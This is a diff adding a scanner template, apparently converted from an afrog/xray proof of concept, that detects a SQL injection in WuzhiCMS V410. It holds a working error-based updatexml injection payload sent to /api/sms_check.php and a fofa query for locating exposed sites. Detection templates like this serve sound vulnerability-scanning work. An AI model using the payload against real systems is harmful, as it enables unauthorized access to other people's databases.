@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 81dc9bdb52d04dc20036dbd8313ed05
+          - sql_error:MySQL Query Error
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20{{md5(1234)}}),0x7e),1)--%20'
+id: wuzhicms-v410-sqli
+info:
+  author: leezp
+  description: |
+    WuzhiCMS V410 存在 SQL 注入漏洞，攻击者可以通过构造特殊的请求参数，在服务器上执行任意 SQL 语句。
+    fofa: app="WuzhiCMS"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: WuzhiCMS V410 sqli
+  severity: high
+  tags: wuzhicms,sqli,argus-import
